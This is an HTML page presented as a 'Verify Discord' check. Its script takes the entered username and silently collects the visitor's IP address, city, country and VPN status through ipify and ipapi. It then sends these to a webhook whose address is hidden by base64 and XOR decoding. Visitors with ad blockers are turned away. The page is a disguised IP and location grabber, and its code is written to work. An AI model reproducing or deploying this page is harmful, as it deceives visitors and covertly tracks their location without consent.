<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>SecVer</title><style>@keyframes x{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}body{margin:0;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;background:linear-gradient(135deg,#2a2a3c,#1f1f2a);background-size:400% 400%;animation:x 25s ease infinite;color:#ececec;overflow:hidden}._{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);animation:y linear infinite}@keyframes y{to{transform:translate(100px,-200px)}}.C{background:rgba(0,0,0,0.9);padding:2rem;border-radius:16px;box-shadow:0 12px 36px rgba(0,0,0,0.7);width:360px;text-align:center;transition:transform .3s}.C:hover{transform:translateY(-8px)}h1{margin:0;font-size:1.8rem}input,button{width:100%;padding:1rem;margin-top:1rem;border:none;border-radius:10px;font-size:1rem;outline:none}input{background:#333445;color:#fff}input::placeholder{color:#888}input:focus{box-shadow:0 0 12px rgba(0,150,255,0.6)}button{background:linear-gradient(45deg,#187bcd,#1e90ff);color:#fff;cursor:pointer;transition:transform .1s}button:active{transform:scale(.97)}.S{opacity:0;transition:opacity .4s;margin-top:1rem}.S.v{opacity:1;color:#ffd700}.f{font-size:.75rem;margin-top:1rem;color:#666}.ad{position:absolute;top:-9999px;width:1px;height:1px;overflow:hidden}</style></head><body><script>for(let i=0;i<25;i++){let e=document.createElement('div');e.className='_';let s=Math.random()*4+2;e.style.width=s+'px';e.style.height=s+'px';e.style.left=100*Math.random()+'vw';e.style.top=100*Math.random()+'vh';e.style.animationDuration=5+Math.random()*15+'s';document.body.appendChild(e)}</script><div class="C"><h1>Verify Discord</h1><input id="i" placeholder="User#0000" autocomplete="off"/><button id="v">Go</button><div id="m" class="S"></div><div class="f">Made by GitHub: @YourUsername</div></div><script>(()=>{const enc="U3RyaW5nVXBkYXRlZEtleURv"; /* fake */ const adDiv=document.createElement('div');adDiv.className='ad';document.body.appendChild(adDiv);const adBlocked=window.getComputedStyle(adDiv).display==='none';const btn=document.getElementById('v'),msg=document.getElementById('m');let last=0;function show(t){msg.textContent=t;msg.classList.add('v')}function getHook(){let s=atob(enc); let out=''; for(let i=0;i<s.length;i++){out+=String.fromCharCode(s.charCodeAt(i)^3);} return out;}btn.addEventListener('click',async()=>{let now=Date.now(); if(now-last<30000){show('‚è≥ Wait');return;} last=now; let user=document.getElementById('i').value.trim(); if(!user){show('‚ùå Enter user');return;} if(adBlocked){show('üö´ AdBlock');return;} show('üîÑ'); btn.disabled=true; try{ let ip=(await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'0.0.0.0'}))).ip; let g=(await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json()).catch(()=>({org:'',city:'N/A',country_name:'N/A'}))); let vpn=/hosting|proxy|vpn|tor/i.test(g.org||''); let payload={username:'Sys',embeds:[{title:`üåê ${g.city}, ${g.country_name}`,color:vpn?16711680:65280,fields:[{name:'User',value:user,inline:1},{name:'Stat',value:vpn?'VPN':'OK',inline:1}],footer:{text:new Date().toLocaleString()}}]}; let hook=getHook(); let res=await fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}); if(!res.ok) await fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}); show(vpn?'üö´ VPN':'‚úÖ OK'); }catch(e){show('‚ùå Err')}finally{btn.disabled=false}})})();</script></body></html>
